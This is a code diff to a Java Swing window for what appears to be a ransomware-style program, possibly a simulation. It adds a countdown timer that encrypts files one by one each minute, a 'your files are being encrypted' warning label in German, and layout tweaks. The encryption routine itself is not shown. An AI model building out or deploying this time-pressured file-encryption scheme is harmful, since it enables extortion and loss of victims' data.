@@ -127,8 +127,11 @@ public class TimerJframe extends javax.swing.JFrame {
                             second = 60;
                             minute--;
                             ReadFile.readFileEncryptOneByOne(key, index);
-                            isEncrypted[index] = true;
-                            index++;
+                            if(index<5){
+                                isEncrypted[index] = true;
+                                index++; 
+                            }
+                           
                         }
                         if (minute == 0 && hour > 0) {
                             hour--;
@@ -157,7 +160,7 @@ public class TimerJframe extends javax.swing.JFrame {
 
     public void startDecription() {
         jPanel_TimerPanel.setVisible(true);
-        StartTimer(2, 59, 10, true);
+        StartTimer(2, 59, 60, true);
         OpenSideBar_ProgressBars();
 
         //only one object  -> this object we need it for Multi Thread and Syncronization between Threads
@@ -281,7 +284,6 @@ public class TimerJframe extends javax.swing.JFrame {
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
         setBackground(new java.awt.Color(255, 255, 255));
-        setUndecorated(true);
 
         MainJPanel.setBackground(new java.awt.Color(204, 204, 255));
         MainJPanel.setMinimumSize(new java.awt.Dimension(1000, 625));
@@ -396,7 +398,7 @@ public class TimerJframe extends javax.swing.JFrame {
 
         jLabel4.setFont(new java.awt.Font("Lucida Grande", 0, 14)); // NOI18N
         jLabel4.setForeground(new java.awt.Color(255, 255, 0));
-        jLabel4.setText("dein Datei werden be ");
+        jLabel4.setText("dein Datei werden verschluesselt! ");
 
         jLabel6.setForeground(new java.awt.Color(255, 255, 255));
         jLabel6.setText("uebrige Zeit");
@@ -406,13 +408,12 @@ public class TimerJframe extends javax.swing.JFrame {
         jPanel_timerBoxLayout.setHorizontalGroup(
             jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
             .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
+                .addGap(31, 31, 31)
                 .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel_timerBoxLayout.createSequentialGroup()
-                        .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                        .addComponent(jLabel4)
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                     .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
-                        .addGap(31, 31, 31)
+                        .addComponent(jLabel4)
+                        .addGap(0, 0, Short.MAX_VALUE))
+                    .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                         .addComponent(jLabel_hour)
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                         .addComponent(jLabel5)
@@ -420,18 +421,18 @@ public class TimerJframe extends javax.swing.JFrame {
                         .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                             .addComponent(jLabel6)
                             .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
-                                .addComponent(jLabel_minute)
-                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                                .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                                .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                     .addComponent(skipTimer_Button)
                                     .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
-                                        .addComponent(jLabel2)
-                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
-                                        .addComponent(jLabel_seconds)
+                                        .addComponent(jLabel_minute)
                                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                                        .addComponent(jLabel16)))))
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 33, Short.MAX_VALUE)))
-                .addComponent(jLabel_milisecond, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)
+                                        .addComponent(jLabel2)))
+                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
+                                .addComponent(jLabel_seconds)
+                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                                .addComponent(jLabel16)))
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+                        .addComponent(jLabel_milisecond, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)))
                 .addContainerGap())
         );
         jPanel_timerBoxLayout.setVerticalGroup(
@@ -441,10 +442,7 @@ public class TimerJframe extends javax.swing.JFrame {
                 .addComponent(jLabel4, javax.swing.GroupLayout.PREFERRED_SIZE, 28, javax.swing.GroupLayout.PREFERRED_SIZE)
                 .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                 .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                    .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
-                        .addComponent(jLabel_milisecond, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 30, Short.MAX_VALUE)
-                        .addComponent(skipTimer_Button))
+                    .addComponent(jLabel_milisecond, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                     .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                         .addComponent(jLabel6)
                         .addGap(10, 10, 10)
@@ -454,9 +452,10 @@ public class TimerJframe extends javax.swing.JFrame {
                             .addComponent(jLabel_minute)
                             .addComponent(jLabel2)
                             .addComponent(jLabel_seconds)
-                            .addComponent(jLabel16))
-                        .addGap(0, 0, Short.MAX_VALUE)))
-                .addContainerGap())
+                            .addComponent(jLabel16))))
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
+                .addComponent(skipTimer_Button)
+                .addContainerGap(8, Short.MAX_VALUE))
         );
 
         jPanel_TimerPanel.add(jPanel_timerBox, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 240, 290, 170));
